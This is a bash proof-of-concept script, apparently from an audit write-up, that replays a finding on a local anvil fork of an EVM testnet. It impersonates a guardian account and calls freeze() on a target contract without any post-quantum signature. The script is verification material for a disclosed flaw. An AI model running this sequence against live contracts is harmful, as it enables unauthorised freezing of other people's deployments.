#!/usr/bin/env bash
# Keyfall replay: KF-02 (Medium) — freeze() succeeds for guardian() without any PQC signature
# Runs on a LOCAL fork only. Needs Foundry (anvil + cast).
set -euo pipefail
anvil --fork-url https://evm-testnet.qore.host --fork-block-number 10539249 --chain-id 9800 --port 8555 --silent & ANVIL=$!; trap "kill $ANVIL" EXIT; sleep 6
R=http://127.0.0.1:8555
cast rpc anvil_setCode 0x0000000000000000000000000000000000000a01 0x600060005260206000f3 --rpc-url $R >/dev/null  # reject: attacker has no ML-DSA-87 key
echo "target balance before: $(cast balance 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 --rpc-url $R)"
# step 1: freeze() as guardian()
cast rpc anvil_impersonateAccount 0x8Ad48346fc47f920dE6c4e56F0837b5C21d25102 --rpc-url $R >/dev/null
cast rpc anvil_setBalance 0x8Ad48346fc47f920dE6c4e56F0837b5C21d25102 0x3635c9adc5dea00000 --rpc-url $R >/dev/null
cast send --unlocked --from 0x8Ad48346fc47f920dE6c4e56F0837b5C21d25102 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 0x62a5af3b --gas-limit 15000000 --rpc-url $R >/dev/null
echo "target balance after:  $(cast balance 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 --rpc-url $R)"
echo "frozen(): $(cast call 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 'frozen()' --rpc-url $R)"
